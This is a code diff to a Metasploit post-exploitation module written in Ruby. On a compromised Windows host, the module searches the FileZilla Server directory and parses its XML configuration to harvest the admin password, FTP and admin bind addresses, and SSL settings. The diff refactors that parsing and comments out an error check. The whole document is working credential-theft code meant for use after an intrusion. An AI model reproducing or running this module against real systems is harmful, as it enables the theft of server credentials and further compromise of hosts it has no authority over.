@@ -50,13 +50,23 @@ class Metasploit3 < Msf::Post
 		end
 
 		filezilla = check_filezilla
-		get_filezilla_creds(filezilla)
+		#if filezilla != nil
+			get_filezilla_creds(filezilla)
+		#end
 	end
 
 	def check_filezilla
 		paths = []
 		path = @progs + "FileZilla Server\\"
+
 		print_status("Checking for Filezilla Server directory in: #{path}")
+
+		#begin
+		#	session.fs.dir.entries(path)
+		#rescue ::Exception => e
+		#	print_error(e.to_s)
+		#	return
+		#end
 
 		session.fs.dir.foreach(path) do |fdir|
 			if fdir =~ /FileZilla\sServer.*\.xml/i
@@ -207,9 +217,12 @@ class Metasploit3 < Msf::Post
 		settings['ftp_port'] = items[0].text rescue "<none>"
 		settings['admin_port'] = items[16].text rescue "<none>"
 		settings['admin_pass'] = items[17].text rescue "<none>"
+		settings['local_host'] = items[18].text rescue ""
+		settings['bindip'] = items[38].text rescue ""
+		settings['ssl'] = items[42].text rescue ""
 
-		if items[18].text # empty means localhost only * is 0.0.0.0
-			settings['admin_bindip'] = items[18].text
+		if settings['local_host'] # empty means localhost only * is 0.0.0.0
+			settings['admin_bindip'] = settings['local_host']
 		else
 			settings['admin_bindip'] = "127.0.0.1"
 		end
@@ -217,8 +230,8 @@ class Metasploit3 < Msf::Post
 			settings['admin_bindip'] = "0.0.0.0"
 		end
 		
-		if items[38].text
-			settings['ftp_bindip'] = items[38].text
+		if settings['bindip']
+			settings['ftp_bindip'] = settings['bindip']
 		else
 			settings['ftp_bindip'] = "127.0.0.1"
 		end
@@ -228,7 +241,7 @@ class Metasploit3 < Msf::Post
 			settings['ftp_bindip'] = "0.0.0.0"
 		end
 
-		if items[42].text == "1"
+		if settings['ssl'] == "1"
 			settings['ssl'] = "true"
 		else
 			if datastore['SSLCERT']
